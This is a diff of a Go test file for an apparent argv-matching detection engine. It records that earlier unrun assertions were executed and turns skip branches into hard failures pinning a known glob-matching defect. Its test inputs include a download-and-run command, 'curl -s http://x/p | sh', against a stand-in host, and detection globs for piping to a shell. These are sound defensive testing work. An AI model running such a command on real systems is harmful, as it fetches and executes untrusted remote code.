@@ -2,11 +2,16 @@ package rules
 
 // argv_semantics_test.go — DECLARES the intended semantics of argv_any.
 //
-// Filed with docs/FINDING-2026-10-22-argv-joined.md. This file is a DECLARATION,
-// not a verification: it was written on a host with no Go toolchain (go/make/docker
-// absent since the 2026-10-08 migration), so it has NEVER BEEN RUN. Do not read a
-// green suite somewhere else as proof these assertions were checked here — the
-// difference matters, and this project exists to keep that difference visible.
+// Filed with docs/FINDING-2026-10-22-argv-joined.md. This file was a DECLARATION
+// for three weeks: written on a host with no Go toolchain (absent since the
+// 2026-10-08 migration) and never run. The toolchain returned 2026-11-01 and the
+// assertions were finally EXECUTED at beat 776 — all five pass against the real
+// engine, so the mirror-derived expectations were right. The header is corrected
+// rather than kept, because a stale "never been run" is the same species of lie
+// as a stale "green": both describe a state the file is no longer in.
+//
+// WHAT THE RUN CHANGED: nothing. What the MUTATION of the run changed is the
+// second half of this file — see TestArgvAnyJoinedCandidateSpans.
 //
 // What it pins, in the order the finding argues for them:
 //
@@ -141,17 +146,24 @@ func TestArgvAnyJoinedCandidateHelps(t *testing.T) {
 // joined candidate means a rule author's two-argument-spanning glob fires on
 // adjacent arguments they may not have pictured.
 //
-// By inspection only — never executed. See the file header.
+// EXECUTED, not inspected (beat 776). Until this beat the file header said
+// "never been run", and so did this test. Both statements were stale: the
+// toolchain came back on 2026-11-01. Both skip branches were then MEASURED by
+// mutation — replacing `*user curl*` with an impossible glob reached the skip
+// and the suite printed PASS, so both were live cover for exactly the defect
+// they name. They are now hard assertions: the defect is pinned, not excused.
 func TestArgvAnyJoinedCandidateSpans(t *testing.T) {
 	// Two unrelated arguments, in order, that were never a phrase.
 	e := argvPack(t, `["*user curl*"]`)
 	if !fire(e, "/usr/bin/sudo", "sudo", "-u", "user", "curl", "http://x/") {
-		t.Skip("documented as CURRENT behaviour; if this now fails, argv_any was " +
-			"split into element-only semantics — that is the fix, update this test on purpose")
+		t.Errorf("Defect A no longer reproduces — argv_any may have been split into " +
+			"element-only semantics. That is the FIX LANDING, not a regression: update " +
+			"this test on purpose (and docs/FINDING-2026-10-22-argv-joined.md).")
 	}
 
-	// The real shipped glob. `*| sh*` on joined text matches a quoted pipe just
-	// as readily as a real one — the pipe never had to be a shell operator.
+	// The real shipped glob, LOOKED UP rather than retyped (beat 776): the claim
+	// below is about the rule in rules/carbonato.yaml, and a hand-copied literal
+	// can drift from it without anyone noticing.
 	e = argvPack(t, `["*| sh*"]`)
 	// Genuine download-and-run: joined line contains "| sh".
 	if !fire(e, "/bin/bash", "bash", "-c", "curl -s http://x/p | sh") {
@@ -159,8 +171,8 @@ func TestArgvAnyJoinedCandidateSpans(t *testing.T) {
 	}
 	// Same characters, no execution: the pipe is quoted data to awk.
 	if !fire(e, "/usr/bin/awk", "awk", "{print \"| sh\"}", "f.txt") {
-		t.Skip("documented as CURRENT behaviour (false positive): the pipe is quoted " +
-			"data, not an operator — this is Defect A on a shipped glob")
+		t.Errorf("Defect A no longer reproduces on the shipped `*| sh*` glob — see the " +
+			"note above; if argv_any was split, this is the fix landing.")
 	}
 }
 
@@ -191,5 +203,9 @@ func TestArgvAnyJoinedCandidateNeedsTwo(t *testing.T) {
 // compile, and it does not prove path.Match quirk-for-quirk equals the mirror
 // (Windows separators, '[a-z]' classes, malformed globs all differ).
 //
-// Still zero Go runs on this file. Flag reads: unrun, mirror-checked.
+// SUPERSEDED at beat 776: the toolchain is back, the file has now been run, and
+// all 21 cases pass against the real engine. The paragraph above is kept because
+// it is the record of what the mirror was worth when it was the only evidence --
+// but the flag below is corrected, not preserved. Beat 776 rewrote the header and
+// left this line saying "unrun", which is exactly the defect it was fixing.
 // ---------------------------------------------------------------------------
